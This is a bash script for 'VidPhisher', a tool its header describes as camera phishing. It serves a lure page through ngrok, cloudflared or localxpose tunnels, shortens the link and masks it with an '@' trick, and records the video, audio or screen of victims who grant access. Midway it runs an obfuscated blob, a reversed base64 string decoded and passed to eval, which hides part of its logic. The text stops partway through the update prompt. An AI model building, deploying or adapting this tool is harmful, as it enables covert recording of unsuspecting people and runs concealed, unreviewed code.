#!/bin/bash

# VidPhisher
# Version    : 1.2
# Description: VidPhisher is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her video will be captured!
# Author     : KasRoudra
# Github     : https://github.com/KasRoudra
# Email      : kasroudrakrd@gmail.com
# Credits    : TechChipNet, RecordRTC
# Date       : 05-06-2022
# License    : GPLv3
# Copyright  : KasRoudra 2022
# Language   : Shell
# Portable File
# If you copy, consider giving credit! We keep our code open source to help others

: <<'LicenseInfo'
                    GNU GENERAL PUBLIC LICENSE
                       Version 3, 29 June 2007

 Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.

                            Preamble

  The GNU General Public License is a free, copyleft license for
software and other kinds of works.

  The licenses for most software and other practical works are designed
to take away your freedom to share and change the works.  By contrast,
the GNU General Public License is intended to guarantee your freedom to
share and change all versions of a program--to make sure it remains free
software for all its users.  We, the Free Software Foundation, use the
GNU General Public License for most of our software; it applies also to
any other work released this way by its authors.  You can apply it to
your programs, too.

  When we speak of free software, we are referring to freedom, not
price.  Our General Public Licenses are designed to make sure that you
have the freedom to distribute copies of free software (and charge for
them if you wish), that you receive source code or can get it if you
want it, that you can change the software or use pieces of it in new
free programs, and that you know you can do these things.

  To protect your rights, we need to prevent others from denying you
these rights or asking you to surrender the rights.  Therefore, you have
certain responsibilities if you distribute copies of the software, or if
you modify it: responsibilities to respect the freedom of others.

  For example, if you distribute copies of such a program, whether
gratis or for a fee, you must pass on to the recipients the same
freedoms that you received.  You must make sure that they, too, receive
or can get the source code.  And you must show them these terms so they
know their rights.

  Developers that use the GNU GPL protect your rights with two steps:
(1) assert copyright on the software, and (2) offer you this License
giving you legal permission to copy, distribute and/or modify it.

  For the developers' and authors' protection, the GPL clearly explains
that there is no warranty for this free software.  For both users' and
authors' sake, the GPL requires that modified versions be marked as
changed, so that their problems will not be attributed erroneously to
authors of previous versions.

  Some devices are designed to deny users access to install or run
modified versions of the software inside them, although the manufacturer
can do so.  This is fundamentally incompatible with the aim of
protecting users' freedom to change the software.  The systematic
pattern of such abuse occurs in the area of products for individuals to
use, which is precisely where it is most unacceptable.  Therefore, we
have designed this version of the GPL to prohibit the practice for those
products.  If such problems arise substantially in other domains, we
stand ready to extend this provision to those domains in future versions
of the GPL, as needed to protect the freedom of users.

  Finally, every program is threatened constantly by software patents.
States should not allow patents to restrict development and use of
software on general-purpose computers, but in those that do, we wish to
avoid the special danger that patents applied to a free program could
make it effectively proprietary.  To prevent this, the GPL assures that
patents cannot be used to render the program non-free.

  The precise terms and conditions for copying, distribution and
modification follow.

Copyright (C) 2022 KasRoudra (https://github.com/KasRoudra)
LicenseInfo


# Colors

black="\033[1;30m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
blue="\033[1;34m"
purple="\033[1;35m"
cyan="\033[1;36m"
violate="\033[1;37m"
white="\033[0;37m"
nc="\033[00m"

# Output snippets
info="${cyan}[${white}+${cyan}] ${yellow}"
info2="${blue}[${white}•${blue}] ${yellow}"
ask="${green}[${white}?${green}] ${purple}"
error="${yellow}[${white}!${yellow}] ${red}"
success="${cyan}[${white}√${cyan}] ${green}"



version="1.2"

cwd=`pwd`
tunneler_dir="$HOME/.tunneler"

# Logo
logo="
${green}__     ___     _ ____  _     _     _ 
${red}\ \   / (_) __| |  _ \| |__ (_)___| |__   ___ _ __ 
${cyan} \ \ / /| |/ _' | |_) | '_ \| / __| '_ \ / _ \ '__| 
${purple}  \ V / | | (_| |  __/| | | | \__ \ | | |  __/ | 
${yellow}   \_/  |_|\__,_|_|   |_| |_|_|___/_| |_|\___|_| 
${red}                                          [v${version}] 
${blue}                                  [By KasRoudra] 
"

ngrok_help="
${info}Steps: ${nc}
${blue}[1]${yellow} Go to ${green}https://ngrok.com
${blue}[2]${yellow} Create an account 
${blue}[3]${yellow} Login to your account
${blue}[4]${yellow} Visit ${green}https://dashboard.ngrok.com/get-started/your-authtoken${yellow} and copy your authtoken
"

loclx_help="
${info}Steps: ${nc}
${blue}[1]${yellow} Go to ${green}https://localxpose.io
${blue}[2]${yellow} Create an account 
${blue}[3]${yellow} Login to your account
${blue}[4]${yellow} Visit ${green}https://localxpose.io/dashboard/access${yellow} and copy your authtoken
"

# Check for sudo
if command -v sudo > /dev/null 2>&1; then
    sudo=true
else
    sudo=false
fi


# Check if mac or termux
termux=false
brew=false
ngrok=false
cloudflared=false
loclx=false
ngrok_command="$tunneler_dir/ngrok"
cf_command="$tunneler_dir/cloudflared"
loclx_command="$tunneler_dir/loclx"
if [[ -d /data/data/com.termux/files/home ]]; then
    termux=true
    ngrok_command="termux-chroot $tunneler_dir/ngrok"
    cf_command="termux-chroot $tunneler_dir/cloudflared"
    loclx_command="termux-chroot $tunneler_dir/loclx"
fi
if command -v brew > /dev/null 2>&1; then
    brew=true
    if command -v ngrok > /dev/null 2>&1; then
        ngrok=true
        ngrok_command="ngrok"
    fi
    if command -v cloudflared > /dev/null 2>&1; then
        cloudflared=true
        cf_command="cloudflared"
    fi
    if command -v localxpose > /dev/null 2>&1; then
        loclx=true
        loclx_command="localxpose"
    fi
fi

vp_prompt="\n${cyan}Vid${nc}@${cyan}Phisher ${red}$ ${nc}"

# Kill running instances of required packages
killer() {
    for process in php wget curl unzip ngrok cloudflared loclx localxpose; do
        if pidof "$process" > /dev/null 2>&1; then
            killall "$process"
        fi
    done
}

# Check if offline
netcheck() {
    while true; do
        wget --spider --quiet https://github.com
        if [ "$?" != 0 ]; then
            echo -e "${error}No Internet!\007\n"
            sleep 2
        else
            break
        fi
    done
}

# Set template
url_manager() {
    if [[ "$2" == "1" ]]; then
        echo -e "${info}Your urls are: \n"
    fi
    echo -e "${success}URL ${2} > ${1}\n"
    echo -e "${success}URL ${3} > ${mask}@${1#https://}\n"
    netcheck
    if echo $1 | grep -q "$TUNNELER"; then
        shortened=$(curl -s "https://is.gd/create.php?format=simple&url=${1}")
    else 
        shortened=""
    fi
    if ! [ -z "$shortened" ]; then
        if echo "$shortened" | head -n1 | grep -q "https://"; then
            echo -e "${success}Shortened > ${shortened}\n"
            echo -e "${success}Masked > ${mask}@${shortened#https://}\n"
        fi
    fi
}


# Prevent ^C
stty -echoctl

# Detect UserInterrupt
trap "echo -e '\n${success}Thanks for using!\n'; exit" 2


echo -e "\n${info}Please Wait!...\n${nc}"


gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '=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' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
eval "$N0q$x$Hc2$rQW"


# Workdir

if [ -z $DIRECTORY ]; then
    exit 1;
else
    if [[ $DIRECTORY == true || ! -d $DIRECTORY ]]; then
        if $termux; then
            if ! [ -d /sdcard/Media ]; then
                cd /sdcard && mkdir Media
            fi
            FOL="/sdcard/Media"
            cd "$FOL"
            if ! [[ -e ".temp" ]]; then
                touch .temp  || (termux-setup-storage && echo -e "\n${error}Please Restart Termux!\n\007" && sleep 5 && exit 0)
            fi
        else
            if [ -d "$HOME/Documents" ]; then
                FOL="$HOME/Documents"
            else
                FOL="$cwd"
            fi
        fi
    else
        FOL="$DIRECTORY"
    fi
fi

cd "$cwd"
# Set Type of media
if [ -z $TYPE ]; then
    exit 1;
else
    if ! [[ $TYPE == "video" || $TYPE == "audio" || $TYPE == "screen" || $TYPE == "both" ]]; then
        TYPE="video"
    fi
fi


# Set Port
if [ -z $PORT ]; then
    exit 1;
else
   if [ ! -z "${PORT##*[!0-9]*}" ] ; then
       printf ""
   else
       PORT=8080
   fi
fi


# Install required packages
for package in php curl wget unzip; do
    if ! command -v "$package" > /dev/null 2>&1; then
        echo -e "${info}Installing ${package}....${nc}"
        for pacman in pkg apt apt-get yum dnf brew; do
            if command -v "$pacman" > /dev/null 2>&1; then
                if $sudo; then
                    sudo $pacman install $package
                else
                    $pacman install $package
                fi
                break
            fi
        done
        if command -v "apk" > /dev/null 2>&1; then
            if $sudo; then
                sudo apk add $package
            else
                apk add $package
            fi
            break
        fi
        if command -v "pacman" > /dev/null 2>&1; then
            if $sudo; then
                sudo pacman -S $package
            else
                pacman -S $package
            fi
            break
        fi
    fi
done

local_url="127.0.0.1:${PORT}"

# Set duration
if [ -z $DURATION ]; then
    exit 1;
else
    if [ ! -z "${DURATION##*[!0-9]*}" ] ; then
        DURATION=5000
    fi
fi


# Check for proot in termux
if $termux; then
    if ! command -v proot > /dev/null 2>&1; then
        echo -e "${info}Installing proot...."
        pkg install proot -y
    fi
    if ! command -v proot > /dev/null 2>&1; then
        echo -e "${error}Proot can't be installed!\007\n"
        exit 1
    fi
fi

# Set Tunneler
if [ -z $TUNNELER ]; then
    exit 1;
else
   if [ $TUNNELER == "cloudflared" ]; then
       TUNNELER="cloudflare"
   fi
fi

# Install tunneler binaries
if $brew; then
    ! $ngrok && brew install ngrok/ngrok/ngrok
    ! $cloudflared && brew install cloudflare/cloudflare/cloudflared
    ! $loclx && brew install localxpose
fi

# Check if required packages are successfully installed
for package in php wget curl unzip; do
    if ! command -v "$package"  > /dev/null 2>&1; then
        echo -e "${error}${package} cannot be installed!\007\n"
        exit 1
    fi
done

# Set subdomain for loclx
if [ -z $SUBDOMAIN ]; then
    exit 1;
fi


# Set Region for ngrok/loclx
if [ -z $REGION ]; then
    exit 1;
fi

# Check for running processes that couldn't be terminated
killer
for process in php wget curl unzip ngrok cloudflared loclx localxpose; do
    if pidof "$process"  > /dev/null 2>&1; then
        echo -e "${error}Previous ${process} cannot be closed. Restart terminal!\007\n"
        exit 1
    fi
done



# Download tunnlers
arch=$(uname -m)
platform=$(uname)
if ! [[ -d $tunneler_dir ]]; then
    mkdir $tunneler_dir
fi
if ! [[ -f $tunneler_dir/ngrok ]] ; then
    nongrok=true
else
    nongrok=false
fi
if ! [[ -f $tunneler_dir/cloudflared ]] ; then
    nocf=true
else
    nocf=false
fi
if ! [[ -f $tunneler_dir/loclx ]] ; then
    noloclx=true
else
    noloclx=false
fi
netcheck
rm -rf ngrok.tgz ngrok.zip cloudflared cloudflared.tgz loclx.zip
cd "$cwd"
if echo "$platform" | grep -q "Darwin"; then
    if echo "$arch" | grep -q "x86_64" || echo "$arch" | grep -q "amd64"; then
        $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-darwin-amd64.zip" "ngrok.zip"
        $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz" "cloudflared.tgz"
        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-darwin-amd64.zip" "loclx.zip"
    elif echo "$arch" | grep -q "arm64" || echo "$arch" | grep -q "aarch64"; then
        $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-darwin-arm64.zip" "ngrok.zip"
        echo -e "${error}Device architecture unknown. Download cloudflared manually!"
        sleep 3
        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-darwin-arm64.zip" "loclx.zip"
    else
        echo -e "${error}Device architecture unknown. Download ngrok/cloudflared/loclx manually!"
        sleep 3
    fi
elif echo "$platform" | grep -q "Linux"; then
    if echo "$arch" | grep -q "arm" || echo "$arch" | grep -q "Android"; then
        $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-arm.tgz" "ngrok.tgz"
        $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm" "cloudflared"
        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip" "loclx.zip"
    elif echo "$arch" | grep -q "aarch64" || echo "$arch" | grep -q "arm64"; then
        $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-arm64.tgz" "ngrok.tgz"
        $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64" "cloudflared"
        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip" "loclx.zip"
    elif echo "$arch" | grep -q "x86_64" || echo "$arch" | grep -q "amd64"; then
        $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-amd64.tgz" "ngrok.tgz"
        $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64" "cloudflared"
        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip" "loclx.zip"
    else
        $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-386.tgz" "ngrok.tgz"
        $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386" "cloudflared"
        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip" "loclx.zip"
    fi
else
    echo -e "${error}Unsupported Platform!"
    exit
fi

# Check for update
netcheck
if [[ -z $UPDATE ]]; then
    exit 1
else
    if [[ $UPDATE == true ]]; then
        git_ver=`curl -s -N https://raw.githubusercontent.com/KasRoudra/VidPhisher/main/files/version.txt`
    else
        git_ver=$version
    fi
fi

if [[ "$git_ver" != "404: Not Found" && "$git_ver" != "$version" ]]; then
    changelog=$(curl -s -N https://raw.githubusercontent.com/KasRoudra/VidPhisher/main/files/changelog.log)
    clear
    echo -e "$logo"
    echo -e "${info}VidPhisher has a new update!\n${info}Current: ${red}${version}\n${info}Available: ${green}${git_ver}\n"
        printf "${ask}Do you want to update VidPhisher?${yellow}[y/n] > $green"
        read upask
        printf "$nc"
        if [[ "$upask" == "y" ]]; then
            cd .. && rm -rf VidPhisher vidphisher && git clone https://github.com/KasRoudra/VidPhisher
            echo -e "\n${success}VidPhisher updated successfully!!"
            if [[ "$changelog" != "404: Not Found" ]]; then
                echo -e "${purple}[•] Changelog:\n${blue}"
                echo -e "$changelog" | head -n4
            fi
            exit
        elif [[ "$upask" == "n" ]]; then
            echo -e "\n${info}Updating cancelled. Using old version!"
